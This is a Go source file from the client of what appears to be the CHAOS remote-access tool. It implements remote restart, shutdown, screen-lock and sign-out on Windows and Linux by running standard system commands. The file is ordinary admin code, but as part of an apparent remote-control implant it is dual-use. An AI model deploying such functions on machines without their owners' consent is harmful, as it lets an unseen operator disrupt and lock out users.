package os

import (
	"github.com/tiagorlampert/CHAOS/client/app/services"
	"github.com/tiagorlampert/CHAOS/client/app/shared/environment"
)

type OperatingSystemService struct {
	Configuration *environment.Configuration
	Terminal      services.Terminal
	OSType        OSType
}

func NewService(
	configuration *environment.Configuration,
	terminal services.Terminal,
	osType OSType,
) services.OS {
	return &OperatingSystemService{
		Configuration: configuration,
		Terminal:      terminal,
		OSType:        osType,
	}
}

func (os OperatingSystemService) Restart() error {
	switch os.OSType {
	case Windows:
		os.Terminal.Run("shutdown -r -t 00", os.Configuration.Connection.ContextDeadline)
	case Linux:
		os.Terminal.Run("reboot", os.Configuration.Connection.ContextDeadline)
	default:
		return services.ErrUnsupportedPlatform
	}
	return nil
}

func (os OperatingSystemService) Shutdown() error {
	switch os.OSType {
	case Windows:
		os.Terminal.Run("shutdown -s -t 00", os.Configuration.Connection.ContextDeadline)
		break
	case Linux:
		os.Terminal.Run("poweroff", os.Configuration.Connection.ContextDeadline)
	default:
		return services.ErrUnsupportedPlatform
	}
	return nil
}

func (os OperatingSystemService) Lock() error {
	switch os.OSType {
	case Windows:
		os.Terminal.Run("Rundll32.exe user32.dll,LockWorkStation", os.Configuration.Connection.ContextDeadline)
		break
	default:
		return services.ErrUnsupportedPlatform
	}
	return nil
}

func (os OperatingSystemService) SignOut() error {
	switch os.OSType {
	case Windows:
		os.Terminal.Run("shutdown -L", os.Configuration.Connection.ContextDeadline)
		break
	default:
		return services.ErrUnsupportedPlatform
	}
	return nil
}
